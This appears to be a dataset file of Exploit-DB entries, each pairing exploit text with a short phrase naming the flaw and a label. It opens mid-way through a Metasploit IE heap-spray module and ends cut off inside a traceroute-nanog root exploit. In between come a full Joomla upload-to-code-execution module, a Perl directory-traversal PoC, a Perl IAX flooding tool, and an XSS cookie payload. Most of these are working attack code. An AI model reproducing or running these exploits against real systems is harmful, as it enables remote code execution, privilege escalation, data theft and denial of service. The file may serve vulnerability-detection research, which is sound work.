'OSVDB', '54706' ], 					[ 'BID', '35028' ], 					[ 'URL', 'http://www.milw0rm.com/exploits/8733' ], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 				}, 			'Payload'        => 				{ 					'Space'         => 1024, 					'BadChars'      => ""\x00\x09\x0a\x0d'\\"", 					'StackAdjustment' => -3500, 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'Windows XP SP0-SP3 / Windows Vista SP0-SP1 / IE 6.0 SP0-2 & IE 7.0', { 'Offset' => 250, 'Ret' => 0x0C0C0C0C } ] 				], 			'DisclosureDate' => 'May 19 2009', 			'DefaultTarget'  => 0)) 	end  	def autofilter 		false 	end  	def check_dependencies 		use_zlib 	end  	def on_request_uri(cli, request) 		# Re-generate the payload 		return if ((p = regenerate_payload(cli)) == nil)  		# Encode the shellcode 		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))  		# Setup exploit buffers 		nops 	  = Rex::Text.to_unescape([target.ret].pack('V')) 		ret  	  = Rex::Text.uri_encode([target.ret].pack('L')) 		blocksize = 0x40000 		fillto    = 500 		offset 	  = target['Offset']  		# Randomize the javascript variable names 		ampx	     = rand_text_alpha(rand(100) + 1) 		j_shellcode  = rand_text_alpha(rand(100) + 1) 		j_nops       = rand_text_alpha(rand(100) + 1) 		j_headersize = rand_text_alpha(rand(100) + 1) 		j_slackspace = rand_text_alpha(rand(100) + 1) 		j_fillblock  = rand_text_alpha(rand(100) + 1) 		j_block      = rand_text_alpha(rand(100) + 1) 		j_memory     = rand_text_alpha(rand(100) + 1) 		j_counter    = rand_text_alpha(rand(30) + 2) 		j_ret        = rand_text_alpha(rand(100) + 1) 		j_eax        = rand_text_alpha(rand(100) + 1) 		j_bof        = rand_text_alpha(rand(100) + 1)  		# Build out the message 		content = %Q| <html> <OBJECT classid='clsid:FE0BD779-44EE-4A4B-AA2E-743C63F2E5E6' id='#{ampx}'></OBJECT> <script language='javascript'> 	#{j_shellcode}=unescape('#{shellcode}'); 	#{j_nops}=unescape('#{nops}'); 	#{j_headersize}=20; 	#{j_slackspace}=#{j_headersize}+#{j_shellcode}.length; 	while(#{j_nops}.length<#{j_slackspace})#{j_nops}+=#{j_nops}; 	#{j_fillblock}=#{j_nops}.substring(0,#{j_slackspace}); 	#{j_block}=#{j_nops}.substring(0,#{j_nops}.length-#{j_slackspace}); 	while(#{j_block}.length+#{j_slackspace}<#{blocksize})#{j_block}=#{j_block}+#{j_block}+#{j_fillblock}; 	#{j_memory}=new Array(); 	for(#{j_counter}=0;#{j_counter}<#{fillto};#{j_counter}++)#{j_memory}[#{j_counter}]=#{j_block}+#{j_shellcode}; 	#{j_eax}=''; 	for(#{j_counter}=0;#{j_counter}<=350;#{j_counter}++)#{j_eax}+=unescape('%FF%FF%FF%FF'); 	#{j_ret}=''; 	for(#{j_counter}=0;#{j_counter}<=#{offset};#{j_counter}++)#{j_ret}+=unescape('#{ret}'); 	#{j_bof}=#{j_eax}+#{j_ret}; 	#{ampx}.ConvertFile(#{j_bof},1,1,1,1,1); 	#{ampx}.ConvertFile(#{j_bof},1,1,1,1,1); 	#{ampx}.ConvertFile(#{j_bof},1,1,1,1,1); 	#{ampx}.ConvertFile(#{j_bof},1,1,1,1,1); </script> </html> 			|  		print_status(""Sending exploit to #{cli.peerhost}:#{cli.peerport}..."")  		# Transmit the response to the client 		send_response_html(cli, content)  		# Handle the payload 		handler(cli) 	end  end",setting an overly long value to 'ConvertFile()',1
9926,"Joomla! Plugin tinybrowser 1.5.12 - Arbitrary File Upload / Execution ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##   require 'msf/core'   class Metasploit3 < Msf::Exploit::Remote  	include Msf::Exploit::Remote::HttpClient  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Joomla 1.5.12 TinyBrowser File Upload Code Execution', 			'Description'    => %q{ 				This module exploits a vulnerability in the TinyMCE/tinybrowser plugin. 				This plugin is not secured in version 1.5.12 of joomla and allows the upload 				of files on the remote server.  				By renaming the uploaded file this vulnerability can be used to upload/execute 				code on the affected system. 			}, 			'Author'         => [ 'spinbad <spinbad.security[at]googlemail.com>' ], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision$', 			'References'     => 				[ 					['URL', 'http://milw0rm.com/exploits/9296'], 					['URL', 'http://developer.joomla.org/security/news/301-20090722-core-file-upload.html'], 				], 			'Privileged'     => false, 			'Payload'        => 				{ 					'DisableNops' => true, 					'Compat'      =>  						{ 							'ConnectionType' => 'find', 						}, 					'Space'       => 1024, 				}, 			'Platform'       => 'php', 			'Arch'           => ARCH_PHP, 			'Targets'        => [[ 'Automatic', { }]], 			'DisclosureDate' => 'July 22 2009', 			'DefaultTarget'  => 0))  			register_options( 				[ 					OptString.new('URI', [true, ""Joomla directory path"", ""/""]), 				], self.class) 	end  	def check 		res = send_request_raw({ 			'uri'     => datastore['URI'] + '/plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/upload.php?type=file&folder=' 		}, 25)  		if (res and res.body =~ /flexupload.swf/) 			 			return Exploit::CheckCode::Vulnerable 	 		end  		return Exploit::CheckCode::Safe 	end   	def retrieve_obfuscation()  	end   	def exploit  		cmd_php = '<?php ' + payload.encoded + '?>' 		 		# Generate some random strings 		cmdscript	= rand_text_alpha_lower(20)  		boundary = rand_text_alphanumeric(6)  		# Static files 		directory 	= '/images/stories/' 		tinybrowserpath = '/plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/' 		cmdpath 	= directory + cmdscript   		# Get obfuscation code (needed to upload files) 		obfuscation_code = nil 		res = send_request_raw({ 			'uri'     => datastore['URI'] + tinybrowserpath + '/upload.php?type=file&folder=' 		}, 25)  		if (res) 			 			if(res.body =~ /""obfus"", ""((\w)+)""\)/) 				obfuscation_code = $1 				print_status(""Successfully retrieved obfuscation code: #{obfuscation_code}"") 			else 				print_error(""Error retrieving obfuscation code!"") 				return 			end 		end 		 		  		# Upload shellcode (file ending .ph.p) 		data = ""--#{boundary}\r\nContent-Disposition: form-data; name=\""Filename\""\r\n\r\n"" 		data << ""#{cmdscript}.ph.p\r\n--#{boundary}"" 		data << ""\r\nContent-Disposition: form-data; name=\""Filedata\""; filename=\""#{cmdscript}.ph.p\""\r\n"" 		data << ""Content-Type: application/octet-stream\r\n\r\n"" 		data << cmd_php 		data << ""\r\n--#{boundary}--""  		res = send_request_raw({																													 			'uri'	  => datastore['URI'] + tinybrowserpath + ""/upload_file.php?folder=/images/stories/&type=file&feid=&obfuscate=#{obfuscation_code}&sessidpass="", 			'method'  => 'POST', 			'data'    => data, 			'headers' => 			{ 				'Content-Length' => data.length, 				'Content-Type'	 => 'multipart/form-data; boundary=' + boundary, 			} 		}, 25)  		if (res and res.body =~ /File Upload Success/) 			print_status(""Successfully uploaded #{cmdscript}.ph.p"") 		else 			print_error(""Error uploading #{cmdscript}.ph.p"") 		end 		 		 		# Complete the upload process (rename file) 		print_status(""Renaming file from #{cmdscript}.ph.p_ to #{cmdscript}.ph.p"")		 		res = send_request_raw({ 			'uri'     => datastore['URI'] + tinybrowserpath + 'upload_process.php?folder=/images/stories/&type=file&feid=&filetotal=1' 		}) 		 		 		# Rename the file from .ph.p to .php 		res = send_request_cgi({                         'method'    => 'POST',                         'uri'       => datastore['URI'] + tinybrowserpath + '/edit.php?type=file&folder=',                                 'vars_post' =>                          {                                 'actionfile[0]' => ""#{cmdscript}.ph.p"", 				'renameext[0]'   => 'p', 				'renamefile[0]' => ""#{cmdscript}.ph"", 				'sortby' => 'name', 				'sorttype' => 'asc', 				'showpage' => '0', 				'action' => 'rename', 				'commit' => '', 				                         }                 }, 10) 		 		if (res and res.body =~ /successfully renamed./)  			print_status (""Renamed #{cmdscript}.ph.p to #{cmdscript}.php"") 		else 			print_error(""Failed to rename #{cmdscript}.ph.p to #{cmdscript}.php"") 		end 		 		 		# Finally call the payload 		print_status(""Calling payload: #{cmdscript}.php"") 		res = send_request_raw({ 			'uri'	=> ""#{datastore['URI'] }images/stories/#{cmdscript}.php"" 		}, 25) 		  	end end",renaming the uploaded file,1
41432,"Lock Photos Album&Videos Safe 4.3 - Directory Traversal Document Title: =============== Lock Photos Album&Videos Safe v4.3 - Directory Traversal Vulnerability   References (Source): ==================== https://www.vulnerability-lab.com/get_content.php?id=2032   Release Date: ============= 2017-02-21   Vulnerability Laboratory ID (VL-ID): ==================================== 2032   Common Vulnerability Scoring System: ==================================== 7.8   Product & Service Introduction: =============================== You can lock and manage your private photos, videos, text messages, voice recordings, notes, documents and other files very easily! You can store  and view PDF, Text(can be created and edited), PowerPoint, Word, Excel, Html, Pages, Key, Numbers and play music very simply! You can as well do  more things in one app and manage your life better!  (Copy of the Homepage: https://itunes.apple.com/us/app/lock-photos-album-video.s/id448033053 )   Abstract Advisory Information: ============================== The vulnerability laboratory core research team discovered a remote directory traversal vulnerability in the official Galaxy Studio Lock Photos Album & Videos Safe v4.3 iOS mobile application.   Vulnerability Disclosure Timeline: ================================== 2017-02-21: Public Disclosure (Vulnerability Laboratory)   Discovery Status: ================= Published   Affected Product(s): ==================== Galaxy Studio (Mo Wellin) Product: Lock Photos Album & Videos Safe - iOS Mobile (Web-Application) 4.3   Exploitation Technique: ======================= Remote   Severity Level: =============== High   Technical Details & Description: ================================ A directory traversal vulnerability has been dsicovered in the official Galaxy Studio Lock Photos Album & Videos Safe v4.3 iOS mobile application. The security vulnerability allows an attackers to unauthorized request and download local application files by usage of manipulated path parameters.  The directory traversal web vulnerability is located in the `PRE` parameter of the wifi web-server interface. Remote attackers are able to request  the local web-server during the sharing process to access unauthenticated application files. Attackers are able to request via form action path  variables to access, download or upload arbitrary files. Remote attackers are able to access the sql-lite database file that own the web-server  access credentials of the application. After the download the attacker is able to access the database management system file to use the credentials  for unauthorized access via protocol. The PRE request with the action form variable allows to inject any path of the local file system without check  for privileges or user access rights. Thus allows an attacker to bypass the local path restriction to compromise the mobile ios web-server application. The request method to inject is GET and the attack vector is located on the client-side of the web-server web-application. Finally an attacker is able  to access with the credentials the service by using a client via http protocol.  The security risk of the directory traversal vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 7.8.  Exploitation of the web vulnerability requires no privilege web-application user account or user interaction. Successful exploitation of the  vulnerability results in information leaking, mobile application compromise by unauthorized and unauthenticated access.  Request Method(s): [+] GET  Vulnerable Module(s): [+] PRE  Vulnerable Parameter(s): [+] form action  Affected Module(s): [+] Web-Server File System   Proof of Concept (PoC): ======================= The security vulnerability can be exploited by remote attackers without user interaction or privilege web-application user account. For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.   Standard Request: http://localhost:5555/?PRE=action form   PoC: Payload //..//..//..//..//..//..//..//..//%00 /../../../../../../../../%00   PoC: Exploitation http://localhost:5555/?PRE=action form=/../../../../../../../../%00   PoC: Exploit use strict; use LWP::UserAgent; my $b = LWP::UserAgent->new(); my $host = ""localhost:5555""; print $b->get(""http://"".$host.""/?PRE=action form=/../../../../../../../../%00"")->content;   --- PoC Session Logs [GET] --- Status: 200[OK] GET http://localhost:5555/?PRE=action%20form=//..//..//..//..//..//..//..//..//%00 Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[0] Mime Type[application/x-unknown-content-type]    Request Header:       Host[localhost:5555]       User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0]       Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]       Accept-Language[de,en-US;q=0.7,en;q=0.3]       Accept-Encoding[gzip, deflate]       Connection[keep-alive]       Upgrade-Insecure-Requests[1]    Response Header:       Date[Di., 21 Feb. 2017 09:21:48 GMT]       Accept-Ranges[bytes]       Content-Length[0]     PoC: Vulnerable Source {   ""paths"" : [     ""/Picture/Public/path/All Image/""   ],   ""folder"" : ""/Picture/Public/path"",   ""code"" : 1 } ... manipulated  {   ""paths"" : [   ],   ""folder"" : ""/../../../../../../../../%00"",   ""code"" : 1 }   Reference(s): http://localhost:5555/ http://localhost:5555/?PRE   Solution - Fix & Patch: ======================= The security vulnerability can be resolved by disallowing users to access the upper path for root privileges. Ensure that the form  action request denies to access web-server data or application configuration files. Parse and restrict the form action parameter to  prevent further directory traversal attacks.   Security Risk: ============== The security risk of the directory traversal web vulnerability in the mobile web-server application is estimated as high. (CVSS 7.8)   Credits & Authors: ================== Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (http://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.)   Disclaimer & Information: ========================= The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed  or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable  in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab  or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability mainly for  consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any licenses, policies,  deface websites, hack into databases or trade with stolen data.  Domains:    www.vulnerability-lab.com 		- www.vuln-lab.com 						- www.evolution-sec.com Section:    magazine.vulnerability-lab.com 	- vulnerability-lab.com/contact.php 				- evolution-sec.com/contact Social:	    twitter.com/vuln_lab		- facebook.com/VulnerabilityLab 				- youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php 	- vulnerability-lab.com/rss/rss_upcoming.php 			- vulnerability-lab.com/rss/rss_news.php Programs:   vulnerability-lab.com/submit.php 	- vulnerability-lab.com/list-of-bug-bounty-programs.php 	- vulnerability-lab.com/register.php  Any modified copy or reproduction, including partially usages, of this file, resources or information requires authorization from Vulnerability Laboratory.  Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by  Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark  of vulnerability-lab team & the specific authors or managers. To record, list, modify, use or edit our material contact (admin@) to get a ask permission.  				    Copyright © 2017 | Vulnerability Laboratory - [Evolution Security GmbH]™",usage of manipulated path parameters,1
21198,"Microsoft Internet Explorer 5 - JavaScript Local File Enumeration (1) source: https://www.securityfocus.com/bid/3779/info  Microsoft Internet Explorer is prone to a vulnerability which may disclose sensitive information to a malicious webmaster.  When script code includes a file outside of the document it is embedded in and the file does not exist, the onError event handler will run script if it is enabled. This script can determine whether the file to be included exists or not. This can be used to verify the existence of files on client hosts by creating webpages that include files from the local host using 'file://'.   <html> <head> <script language=""javascript""> <!-- var fileExists = false; function yes() { alert(""the file exists.""); yes = true; }  function no() { if(!fileExists) { alert(""the file does not exist.""); } }  window.onerror = yes window.onload = no //--> </script> <script language=""javascript"" src=""file://c:\autoexec.bat""></script> </head> </html>",disclose sensitive information to a malicious webmaster,1
32095,"Asterisk 1.6 IAX - 'POKE' Requests Remote Denial of Service source: https://www.securityfocus.com/bid/30321/info  Asterisk is prone to a remote denial-of-service vulnerability because it fails to handle multiple 'POKE' requests in quick succession.  Attackers can exploit this issue by sending a persistent stream of 'POKE' requests that will consume processor resources and deny service to legitimate users.  NOTE: By default, 'POKE' requests are not logged by Asterisk.   #!/usr/bin/perl -w #udp IAX ping discovery and injection tool #Created: Blake Cornell #Released under no license, use at your own free will # # Do not hesitate to show enthusiasm and support # 	and help develop this further.  use strict; use IO::Socket; use Getopt::Long; use Net::Subnets; use Pod::Usage;   my @target_port = (4569); my @targets = ('127.0.0.1');  my $result = GetOptions('port|p=i' => \(my $port = ''), 			'sport|sp=i' => \(my $sport = ''), 			'eport|ep=i' => \(my $eport = ''), 			'source|sip=s' => \(my $source = ''), 			'host|h=s' => \(my $host = ''), 			'inject|in' => \(my $inject = ''), 			'dos' => \(my $dos = ''), 			'timeout|t=i' => \(my $timeout = ''), 			'dundi-check|dundi' => \(my $dundi = ''), 			'verbose|v' => \(my $verbose = ''), 			'help|?' => \(my $help = '')) or pod2usage(2);  if($help) { printUsage(); } if($host) { @targets=@{retHosts($host)}; } if($port) { $target_port[0] = $port; } if($dundi) { print ""DUNDI Option Scan not supported yet.""; } if($source) { print ""Setting of the source IP address is only supported  in inject mode""; }   if($inject) {  	if($verbose) { print ""INJECTION MODE""; } 	if(!@targets) { 		print ""\nSet the host ( -h ) option\n""; 		return 1; 	} 	for(my $i=20000;$i<=65535;$i++) { 		for(my $j=0;$j<=$#targets;$j++) { 			if($verbose) { print $targets[$j]; } 			injectIAXPoke($targets[$j],$source,$i,0); 		} 	#my($target,$source,$port,$timeout,@args)=@_; 	} 	exit; }  if($dos) { 	while(1) { 		for(my $j=0;$j<=$#targets;$j++) { 			if($verbose) { print $targets[$j]; } 			dosIAXPoke($targets[$j],4569,$timeout); 		} 		 	} }  if($sport ne '' && $eport ne '') { #defined doesn't work for getoptions 				#devices are always defined 	if($verbose ne '') { print ""Scanning Port Range\n""; } 	if($eport < $sport) { 		my $tmp = $eport; 		$eport = $sport; 		$sport = $tmp; 	} 	if($sport < 1) { $sport = 1; } 	if($eport > 65535) { $eport = 65535; } 	if($timeout ne '' && $verbose ne '') { 		if($timeout <= 0) { 			$timeout = 1; 		} 		print ""Scanning Ports $sport through $eport\n""; 		print ""Setting timeout to $timeout\n""; 	}  	@target_port=(); 	for(my $i=$sport; $i <= $eport; $i++) { 		push(@target_port,$i); 	} 	sendIAXPokes(\@targets,\@target_port);  }else{	#scanning only default port... 	sendIAXPokes(\@targets,\@target_port); }  sub sendIAXPokes { 	my($targets_ref,$target_ports_ref,@args)=@_;  	my @targets=@{$targets_ref}; 	my @target_ports=@{$target_ports_ref};  	for(my $i=0;$i<=$#targets;$i++) { 		for(my $j=0;$j<=$#target_ports;$j++) { 			 sendIAXPoke($targets[$i],$target_ports[$j],$timeout); 		} 	} }  sub sendIAXPoke { 	my($target,$port,$timeout,@args)=@_;  	if($verbose) { 		print ""Trying $target:$port\n"";  	} 	socket(PING, PF_INET, SOCK_DGRAM, getprotobyname(""udp""));  	my $src_call = ""8000"";  	my $dst_call = ""0000""; 	my $timestamp = ""00000000""; 	my $outbound_seq = ""00""; 	my $inbound_seq = ""00""; 	my $type = ""06""; #IAX_Control 	my $iax_type = ""1e""; #POKE 	my $msg = pack ""H24"", $src_call . $dst_call . $timestamp .  $outbound_seq . $inbound_seq . $type . $iax_type;  	my $ipaddr = inet_aton($target); 	my $sin = sockaddr_in($port,$ipaddr);  	send(PING, $msg, 0, $sin) == length($msg) or die ""cannot send to  $target : $port : $!\n"";  	my $MAXLEN = 1024; 	my $TIMEOUT = 1; 	if(defined($timeout) && $timeout ne '' && $timeout != 0) {  #timeout of 0 hangs 								 #unanswered requests 		$TIMEOUT=$timeout; 	} 	eval { 		local $SIG{ALRM} = sub { die ""alarm time out""; }; 		alarm $TIMEOUT;  		while (1) { 			my $recvfrom = recv(PING, $msg, $MAXLEN, 0) or  die ""recv: $!""; 			($port, $ipaddr) = sockaddr_in($recvfrom); 			my $respaddr = inet_ntoa($ipaddr); 			print ""Response from $respaddr : $port\n""; 			return($respaddr,$port); 		}  	};  }  sub injectIAXPoke { 	my($target,$source,$port,$timeout,@args)=@_;  	socket(PING, PF_INET, SOCK_DGRAM, getprotobyname(""udp""));  	my $src_call = ""8000"";  	my $dst_call = ""0000""; 	my $timestamp = ""00000000""; 	my $outbound_seq = ""00""; 	my $inbound_seq = ""01""; #increment by one did he say? 	my $type = ""06""; #IAX_Control 	my $iax_type = ""03""; #PONG 	my $msg = pack ""H24"", $src_call . $dst_call . $timestamp .  $outbound_seq . $inbound_seq . $type . $iax_type;  	my $targetIP = inet_aton($target); 	my $sin = sockaddr_in($port,$targetIP);  	send(PING, $msg, 0, $sin) == length($msg) or die ""cannot send to  $target : $port : $!\n""; }  sub retHosts { 	my($host,@args)=@_; 	my @addrs; 	 	if(!$host) { return ('127.0.0.1') };  	if($host =~  /^([\d]{1,3}).([\d]{1,3}).([\d]{1,3}).([\d]{1,3})\/([\d]{1,2})$/ && $1  >= 0 && $1 <= 255 && $2 >= 0 && $2 <= 255 && $3 >= 0 && $3 <= 255 && $4  >= 0 && $4 <= 255) { 					#Check to see if host is valid  class C CIDR Address 	 	if($verbose) { print ""Setting CIDR Address Range\n""; } 		my $sn = Net::Subnets->new; 		 		my($low,$high)=$sn->range(\$host); 		if($verbose) { print ""Determined IP Ranges From $$low -  $$high\n""; } 		return \@{ $sn->list(\($$low,$$high)) }; 		 	}elsif($host =~  /^([\d]{1,3}).([\d]{1,3}).([\d]{1,3}).([\d]{1,3})$/ && $1 >= 0 && $1 <=  255 && $2 >= 0 && $2 <= 255 && $3 >= 0 && $3 <= 255 && $4 >= 0 && $4 <=  255)  { 					#Check to see if host is valid  IP 		push(@addrs,""$1.$2.$3.$4""); 	}else{ 		push(@addrs,$host); 	} 	return \@addrs; }  sub dosIAXPoke { 	my($target,$port,$timeout,@args)=@_;  	if($verbose) { 		print ""Trying $target:$port\n"";  	} 	socket(PING, PF_INET, SOCK_DGRAM, getprotobyname(""udp""));  	my $src_call = ""8000"";  	my $dst_call = ""0000""; 	my $timestamp = ""00000000""; 	my $outbound_seq = ""00""; 	my $inbound_seq = ""00""; 	my $type = ""06""; #IAX_Control 	my $iax_type = ""1e""; #POKE 	my $msg = pack ""H24"", $src_call . $dst_call . $timestamp .  $outbound_seq . $inbound_seq . $type . $iax_type;  	my $ipaddr = inet_aton($target); 	my $sin = sockaddr_in($port,$ipaddr);  	send(PING, $msg, 0, $sin) == length($msg) or die ""cannot send to  $target : $port : $!\n""; }   sub printUsage { 	print ""$0 -h remoteorigin.com \n\t\tScans remoteorigin.com on  default port of 4569\n""; 	print ""$0 -h remoteorigin.com -sp 4000 -ep 5000\n\t\tScans ports  4000 through 5000 on server remoteorigin.com\n""; 	print ""$0 --source remoteorigi.com -h 127.0.0.1  --inject\n\t\tInjects Forged Poke Replies to 127.0.0.1 from  remoteorigin.com\n""; 	print ""$0 --dos\n\t\tThis will continually send IAX Poke  packets.  This will eat up CPU cycles and isn't logged by default\n""; 	exit; }",multiple 'POKE' requests in quick succession,1
23746,"XMB Forum 1.8 - 'editprofile.php?user' Cross-Site Scripting source: https://www.securityfocus.com/bid/9726/info   XMB Forum has been reported prone to multiple cross-site scripting, HTML injection and SQL injection vulnerabilities. The issues present themselves due to insufficient sanitization of remote user supplied data. An attacker may exploit any one of these vulnerabilities to execute arbitrary script code in the browser of an unsuspecting user or to have malicious SQL queries executed in the underlying database.  http://www.example.com/xmb18sp2/editprofile.php?user=x""><%73cript>alert(document.cookie);</%73cript>",malicious SQL queries,1
22014,"Traceroute-nanog 6 - Local Buffer Overflow // source: https://www.securityfocus.com/bid/6166/info  A vulnerability has been discovered in Traceroute-nanog. It has been reported that Traceroute-nanog contains a buffer overflow condition.  The overflow occurs in the 'get_origin()' function in the 'traceroute.c' file. Due to insufficient bounds checking performed by the whois parser, it may be possible to cause 'get_origin()' to corrupt memory on the system stack.  This vulnerability can be exploited by an attacker to gain root privileges on a target host.   /*  ---[ Traceroute-nanog 6.0 -> 6.1.1 exploit ]---  By Carl Livitt (carl@learningshophull.co.uk)  Exploits a stack overflow in get_origin() function of traceroute.c to gain r00t. Tested on SuSE 7.1, 7.2, 7.3 & 8.0, but should work on 7.0 and 6.x.  There are lots more overflows in this traceroute implementation... mostly heap overflows I think. Have a look, have some fun.   ---[ About this exploit ]---  Traceroute-nanog can do WHOIS-like DNS lookups at each hop and find the admin email address for each IP. It is possible to set environment variables to tell traceroute the IP and port number of your own custom DNS server.  Unfortunately, traceroute fails to error-check the returned records, making it possible to trick it into causing a stack overflow (but with limitations).  My technique was to write my own malicious server that would inject a carefully crafted response to traceroute's query, triggering the overflow and letting me obtain local r00t access.  ---[ More Info ]---  When get_origin() is called, the stack looks like this:   char buf[256]     tmp4[100] tmp3[100] tmp2[100]  tmp1[100] EBP EIP  [bbbbbbbbbbbbbbbbbb44444444443333333333222222222221111111111BBBBIIII] -> 0xbfffffff  There is an 8k buffer called 'reply' on the heap. Its purpose is to hold the entire reply from the  server. It is populated by repeated calls to read(2), each call reading 256 bytes into buf[] which are then concatenated into reply[]. Incedentally,  no bounds checking is done on reply[], making it possible to cause a heap overflow:  count = 0;         while ((n = read(s, buf, sizeof(buf))) > 0) {             strcpy((char *)&reply[count],(char *)buf);             count += n;         }  After reading the entire reply into reply[], get_origin() then parses the contents; this is where the lack of bounds checking becomes apparent:  rp = (char *)reply;          origin[0]='\0';         reply[MAXREPLYLEN-1]='\0';          rp = (char *)strstr(rp,tmp2);            while (rp != 0) {                                                                    pp = (char *)strstr(rp,tmp3);                    if (pp == 0) {                              prefix = 0;                           } else {               prefix = atoi(pp+1);                  }             if (prefix >= best_prefix) {                i = (char *)strstr(pp,tmp);                      if (i != 0) {                                       i += strlen(DATA_DELIMITER);                     i++;                                             while (*i == ' ') i++;                                             j = i;                                           while (*j >= '0') j++;	// CHAR FILTERING                  if (prefix > best_prefix) {                     strcpy(origin,""/"");                              best_prefix = prefix;                                 } else {                     strcat(origin,""/"");                           }                  strncpy(tmp4,i,(j-i)); // OVERFLOW                  tmp4[j-i] = '\0';                                if (!(strstr(origin,tmp4))) {                       strncat(origin,i,(j-i));                      } else {                     if (prefix == best_prefix)                          origin[strlen(origin)-1] = '\0';                  }                }             }             rp = (char *)strstr(rp+1,tmp2);               }    get_origin() finds the word 'route:' in reply[], then reads the number that follows  it. If the number is greater than best_prefix (zero), then get_origin() continues to  parse the reply[] buffer. It sets two pointers (*i, *j) to just past the location of  the string 'origin:', and then increments *j until a character < ASCII '0' is found.   So, *i marks the start of the buffer to copy into tmp4[] and *j marks the end of the buffer. Because tmp4[] is 100 bytes long and it is possible to construct a reply of  arbitrary length, it is trivial to overflow tmp4[], tmp3[], tmp2[] and tmp1[], over- writing values on the stack.  To exploit this overflow is not quite that simple, however. To redirect the flow of execution, the EIP saved on the stack needs to be overwritten with a value such as 0xbfff4567; the problem is that while the chars 0x67 and 0x45 pass the filter mentioned above (*j >='0'), the chars 0xbf and 0xff do not (j is of type 'char'. Valid values that pass through the filter are 0x30 -> 0x7f). If 0xffbf was to be embedded  into the reply[] buffer as part of the overflow data, processing of the reply would  stop and the tmp4[] buffer would not be overflowed.  This means that we cannot directly affect EIP. That leaves EBP. Again we face the same problem: we can only overwrite EBP with values in the range 0x30 -> 0x7f.... and one other: NULL (0x00). The NULL byte cannot pass through the filter if placed there by an attacker, but it doesn't matter because get_origin() NULL-terminates the tmp4[] buffer for us.  So, it is possible to do an off-by-one attack (or off-by-two; more on that later) by using the NULL byte to overflow the least-significant byte of the saved EBP. There's only one more problem to overcome: we still need to get a malicious EIP value onto the stack somewhere it can be reached via an off-by-one attack. However, we can't place the EIP into the exploit buffer, because the 0xbfffxxxx will not pass through the filter. Luckily, the reply[] buffer is populated by copying from the stack to the heap via the buf[] buffer in 256 bytes chunks until there is no more data to copy. We can (ab)use  this behaviour by writing the exact amount of data into reply[] (via buf[]) that is needed to cause the overflow, then write a value less than '0' which will stop  get_origin() processing the exploit buffer and then we can write as many bytes as we like into buf[] (up to 256) _of any value we like_.  All of this can be put together to form an exploit string that will overflow EBP,  fill buf[] with our evil EIP and let us execute arbitrary shellcode (stored in an environment variable on the stack).  The trouble with this technique is that an off-by-one exploit only gives us one possible location on the stack to find our evil EIP (remember, it's in buf[]). It is not possible to reach _any_ address in buf[] using an off-by-one because buf[] is located too far away on the stack. Even by padding out the stack with environment variables to alter ESP doesn't work: we can't reach buf[]. However, it IS possible to use an off-by-two attack:  Off-by-one: ----------- 0xbffffabc becomes 0xbffffa00  Off-by-two: ----------- 0xbffffabc becomes 0xbfff00nn where nn is any value in range 0x30 -> 0x7f.  Aha! Now we've got a lot more flexibility in how we can reach buf[], and thus EIP. All that is needed is to pad the stack by about 64K so that buf[] is located near 0xbfff00nn. This is accomplished by using an enormous environment variable to hold our shellcode... in the exploit code I use about 64K of NOPs to do the trick. This has the added bonus that it's difficult to miss 64K of NOPs when jumping to shellcode!  This exploit was very interesting to write. A couple of times I threw my hands up in disgust as I thought it was not going to be possible to execute shellcode... but it just goes to show what a little coffee and lateral thinking can do.    ---[ Usage ]---  First, you must start the malicious daemon that will answer traceroute's query. It  can run on the same machine as you are exploiting, or on a different one... it makes no difference. Then, you run the exploit which will start traceroute with the  correct environment variables to cause the overflow:  Example 1: --------------  carl@titan:~/exploits/nanog-6.1.1 > ./traceroute-exploit -d Now run this exploit with the '-e' flag. carl@titan:~/exploits/nanog-6.1.1 > ./traceroute-exploit -e traceroute to www.yahoo.akadns.net (66.218.71.80), 30 hops max, 40 byte packets  1 sh-2.05# id uid=0(root) gid=100(users) groups=100(users) sh-2.05#   Example 2: --------------  carl@testingserver:/tmp > /sbin/ifconfig eth0 |grep inet           inet addr:192.168.1.100  Bcast:192.168.1.255  Mask:255.255.255.0 carl@testingserver:/tmp > ./traceroute-exploit -d Now run this exploit with the '-e' flag.   carl@titan:~/exploits/nanog-6.1.1 > ./traceroute-exploit -e -s 192.168.1.100 traceroute to www.yahoo.akadns.net (64.58.76.179), 30 hops max, 40 byte packets  1 sh-2.05# id uid=0(root) gid=100(users) groups=100(users),102(wwwrun) sh-2.05#   Note that you _must_ run this exploit in '-d' (daemon) mode first, otherwise the traceroute will just run as normal and you'll never be able to exploit it.  ---[ Thats all folks ]---  Maybe this exploit has bugs, maybe not. Who knows for sure? Who cares, it's an exploit that does what I needed and no more. Maybe I'll spend time refining it later.  On that note, if you make any additions/bugfixes/changes, then please mail copies of the source back to me... thanks.  Have a nice r00t, Carl. */   #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h> #include <arpa/inet.h> #include 